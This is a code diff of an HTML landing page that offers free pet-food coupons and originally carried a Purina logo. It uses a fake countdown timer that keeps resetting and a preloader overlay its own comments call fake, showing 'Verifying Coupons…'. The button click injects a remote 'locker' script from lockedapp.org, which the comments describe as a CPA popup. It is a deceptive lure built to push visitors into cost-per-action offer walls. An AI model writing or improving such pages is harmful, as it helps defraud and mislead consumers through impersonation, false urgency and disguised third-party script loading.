@@ -6,113 +6,120 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body {
-    margin: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    background: #ededed;
+body{
+    margin:0;
+    font-family:Arial,Helvetica,sans-serif;
+    background:#ededed;
 }
 
-/* Full width wrapper */
-.wrapper {
-    width: 100%;
-    background: #ffffff;
+.wrapper{
+    width:100%;
+    background:#fff;
 }
 
-/* BIG BRAND HEADER */
-.header {
-    background: #e60000;
-    text-align: center;
-    padding: 35px 10px;
+.header{
+    background:#e60000;
+    text-align:center;
+    padding:35px 10px;
 }
 
-.header img {
-    max-width: 520px;
-    width: 95%;
+.header img{
+    width:95%;
+    max-width:520px;
 }
 
-/* HERO IMAGE */
-.hero {
-    background: #fff2c8;
-    text-align: center;
-    padding: 20px 0;
+.hero{
+    background:#fff2c8;
+    text-align:center;
+    padding:20px 0;
 }
 
-.hero img {
-    width: 98%;
-    max-width: 1400px;
-    border-radius: 22px;
+.hero img{
+    width:98%;
+    max-width:1400px;
+    border-radius:22px;
 }
 
-/* URGENCY BAR */
-.urgency {
-    background: #000;
-    color: #fff;
-    text-align: center;
-    padding: 15px;
-    font-size: 20px;
-    font-weight: bold;
+.urgency{
+    background:#000;
+    color:#fff;
+    padding:15px;
+    text-align:center;
+    font-size:20px;
+    font-weight:bold;
 }
 
-/* MAIN CONTENT */
-.content {
-    text-align: center;
-    padding: 45px 20px;
+.content{
+    text-align:center;
+    padding:45px 20px;
 }
 
-.content h1 {
-    font-size: 42px;
-    font-weight: bold;
-    margin-bottom: 15px;
+.content h1{
+    font-size:42px;
+    font-weight:bold;
+    margin-bottom:15px;
 }
 
-.content p {
-    font-size: 24px;
-    font-weight: bold;
-    margin-bottom: 25px;
+.content p{
+    font-size:24px;
+    font-weight:bold;
+    margin-bottom:25px;
 }
 
-/* COUNTDOWN */
-.timer {
-    font-size: 26px;
-    font-weight: bold;
-    color: #e60000;
-    margin-bottom: 30px;
+.timer{
+    font-size:26px;
+    font-weight:bold;
+    color:#e60000;
+    margin-bottom:30px;
 }
 
-/* CTA BUTTON */
-.cta-btn {
-    background: linear-gradient(135deg, #ff7a00, #ff2e00);
-    color: #ffffff;
-    border: none;
-    padding: 25px 65px;
-    font-size: 26px;
-    font-weight: bold;
-    border-radius: 70px;
-    cursor: pointer;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.35);
-    animation: pulse 1.5s infinite;
+.cta-btn{
+    background:linear-gradient(135deg,#ff7a00,#ff2e00);
+    color:#fff;
+    border:none;
+    padding:25px 65px;
+    font-size:26px;
+    font-weight:bold;
+    border-radius:70px;
+    cursor:pointer;
+    box-shadow:0 10px 25px rgba(0,0,0,.35);
+    animation:pulse 1.5s infinite;
 }
 
-@keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.05); }
-    100% { transform: scale(1); }
+@keyframes pulse{
+    0%{transform:scale(1)}
+    50%{transform:scale(1.05)}
+    100%{transform:scale(1)}
 }
 
-/* TRUST TEXT */
-.trust {
-    margin-top: 25px;
-    font-size: 16px;
-    color: #555;
+.trust{
+    margin-top:25px;
+    font-size:16px;
+    color:#555;
 }
 
-/* FOOTER */
-.footer {
-    background: #f1f1f1;
-    text-align: center;
-    padding: 15px;
-    font-size: 13px;
-    color: #777;
+.footer{
+    background:#f1f1f1;
+    text-align:center;
+    padding:15px;
+    font-size:13px;
+    color:#777;
+}
+
+/* Fake preloader overlay */
+#preload{
+    position:fixed;
+    top:0;left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,.85);
+    color:#fff;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    font-size:22px;
+    font-weight:bold;
+    z-index:9999;
 }
 </style>
 </head>
@@ -123,12 +130,12 @@ body {
 
     <!-- BRAND -->
     <div class="header">
-        src="https://i.imgur.com/9NPtlKt.jpeg" alt="Purina">
+        <img src="https://i.imgur.com/9NPtlKt.jpeg" alt="Brand Logo">
     </div>
 
-    <!-- HERO IMAGE -->
+    <!-- HERO -->
     <div class="hero">
-        src="https://i.imgur.com/1U6mDno.jpeg" alt="Pet Food Deals">
+        <img src="https://i.imgur.com/1U6mDno.jpeg" alt="Pet Deals">
     </div>
 
     <!-- URGENCY -->
@@ -146,7 +153,7 @@ body {
             ⏳ Offer Expires In: 09:59
         </div>
 
-        <button class="cta-btn" onclick="openCoupon()">
+        <button class="cta-btn" id="couponBtn">
             🎁 I WANT COUPONS
         </button>
 
@@ -158,30 +165,48 @@ body {
     <div class="footer">
         © 2025 Pet Deals | Limited Promotional Offer
     </div>
+</div>
 
+<!-- Fake loading overlay -->
+<div id="preload">
+    🔓 Verifying Coupons…
 </div>
 
 <script>
-/* Countdown Timer */
-let time = 599;
-setInterval(() => {
-    let minutes = Math.floor(time / 60);
-    let seconds = time % 60;
-    document.getElementById("timer").innerHTML =
-        "⏳ Offer Expires In: " +
-        String(minutes).padStart(2,'0') + ":" +
-        String(seconds).padStart(2,'0');
+/* Countdown */
+let time=599;
+setInterval(()=>{
+    let m=Math.floor(time/60);
+    let s=time%60;
+    document.getElementById("timer").innerHTML=
+        "⏳ Offer Expires In: "+
+        String(m).padStart(2,"0")+":"+
+        String(s).padStart(2,"0");
     time--;
-    if(time < 0) time = 599;
-}, 1000);
+    if(time<0)time=599;
+},1000);
 
-/* CPA Popup Script */
-function openCoupon() {
-    var s = document.createElement("script");
-    s.type = "text/javascript";
-    s.id = "ogjs";
-    s.src = "https://lockedapp.org/cl/js/j778mn";
-    document.body.appendChild(s);
+/* Locker popup – same page, all devices */
+var btn=document.getElementById("couponBtn");
+btn.addEventListener("click",openLocker,false);
+btn.addEventListener("touchstart",openLocker,false);
+
+function openLocker(e){
+    e.preventDefault();
+    e.stopPropagation();
+
+    document.getElementById("preload").style.display="flex";
+
+    setTimeout(()=>{
+        if(!document.getElementById("ogjs")){
+            var s=document.createElement("script");
+            s.type="text/javascript";
+            s.id="ogjs";
+            s.src="https://lockedapp.org/cl/js/j778mn";
+            document.body.appendChild(s);
+        }
+        document.getElementById("preload").style.display="none";
+    },1200);
 }
 </script>
 
